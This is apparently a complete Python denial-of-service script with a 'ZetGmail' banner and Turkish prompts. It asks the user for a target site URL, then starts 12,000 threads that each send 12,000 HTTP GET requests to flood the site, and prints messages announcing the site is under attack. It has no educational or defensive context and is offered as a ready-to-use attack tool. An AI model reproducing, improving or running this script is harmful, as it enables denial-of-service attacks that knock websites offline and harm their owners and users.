import smtplib
import requests
import threading
import random
import os
import cloudscraper
scraper = cloudscraper.create_scraper()
os.system("clear")
banner=("""\33[31m
  ______    _    _____                 _ _
 |___  /   | |  / ____|               (_) |
    / / ___| |_| |  __ _ __ ___   __ _ _| |
   / / / _ \ __| | |_ | '_ ` _ \ / _` | | |
  / /_|  __/ |_| |__| | | | | | | (_| | | |
 /_____\___|\__|\_____|_| |_| |_|\__,_|_|_|
\33[0m""")
print(banner)
url=input("Site Linki Giriniz : ")
mesaj=input("Ddos Mesajı Giriniz: ")
print("Yallah Başladık")
print("Bismillah Hayırlı Ddoslar")
print("Site Şuan Saldırı Altında...")
def ch():
    for i in range(12000):
        try:
                x = requests.get(url)
        except:
                pass
for i in range(12000):
    ta = threading.Thread(target=ch)
    ta.start()
